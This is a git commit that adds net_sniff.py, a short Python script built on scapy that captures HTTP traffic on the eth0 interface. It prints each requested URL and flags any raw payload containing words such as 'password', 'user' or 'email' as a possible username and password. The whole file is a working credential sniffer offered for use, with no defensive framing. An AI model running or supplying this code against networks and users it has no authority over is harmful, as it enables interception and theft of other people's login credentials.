a7199c2a70004ed772bd3b6b785d564aea1759df
Aviral Harsh <64276191+aviralharsh@users.noreply.github.com>
2020-06-09 17:39:38 +0530

    Create net_sniff.py

---
+++ Network Sniffer/net_sniff.py
@@ -0,0 +1,28 @@
+#! usr/bin/env python
+import scapy.all as scapy
+from scapy.layers import http
+
+def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packets)
+
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        keywords = ["Username", "uname", "login", "email", "password", "pass", "user"]
+        for keyword in keywords:
+            if keyword in load:
+                return load
+
+def process_sniffed_packets(packet):
+    if packet.haslayer(http.HTTPRequest):
+        url = get_url(packet)
+        print("[+] HTTP Request >> " + url)
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n[+] Possible Username/Password >> " + login_info + "\n\n")
+
+# I have set the default interface as eth0. Modify it as per your requirements.
+sniff("eth0")
